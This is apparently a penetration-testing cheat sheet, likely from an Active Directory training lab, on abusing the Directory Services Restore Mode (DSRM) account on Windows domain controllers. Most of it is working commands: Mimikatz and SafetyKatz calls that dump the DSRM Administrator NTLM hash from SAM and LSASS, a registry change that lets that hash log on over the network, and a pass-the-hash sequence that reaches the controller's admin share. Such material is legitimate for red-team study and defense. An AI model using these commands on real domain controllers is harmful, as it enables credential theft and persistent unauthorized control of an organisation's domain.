# DSRM

Directory Services Restore Mode (DSRM) is a Safe Mode boot option for Windows Server domain controllers and the main purpose of DSRM is to help system admins log in to the system to restore or repair an AD database.\
\
Every Domain controller has local administrator account called "Administrator" and his password is the DSRM password.
\
A lot of times organizations will not even know what the DSRM password is.

## Dump DSRM NTLM hash

{% hint style="info" %}
Require Domain Admin privileges
{% endhint %}

```powershell
# dumping from sam - DSRM local Administrator hash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' 
# Or with SafetyKatz cmd
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
```

```powershell
# dumping from lsass - Administrator hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
```

## Change Logon Behavior

In order to use DSRM account hash we need to change his registry key

```powershell
# Entering DC session
Enter-PSSession -ComputerName dcorp-dc

# Check if key exists
Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior'

# If exists set his value to 2
Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior' -Value 2 -Verbose
# OR With CMD
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f

# If does not exist create it and set his value to 2
New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD -Verbose
```

## Passing the hash

<pre class="language-powershell"><code class="lang-powershell"># /domain - the domain controller
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator
/ntlm:a102ad5753f4c441e3af31c97fad86fd 
/run:powershell.exe"'
# OR with SafetyKatz
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:&#x3C;DSRM_NTML> /run:cmd.exe" "exit"
<strong>
</strong><strong># Set the DC IP in trust list.
</strong>Set-Item WSman:\localhost\Client\TrustedHosts &#x3C;DC-IP>
# Check if worked
ls \\dcorp-dc\C$
Enter-PSSession -ComputerName &#x3C;DC-IP> -Authentication NegotiateImplictCredential
</code></pre>

Use `$env:username` to get the logged in username.
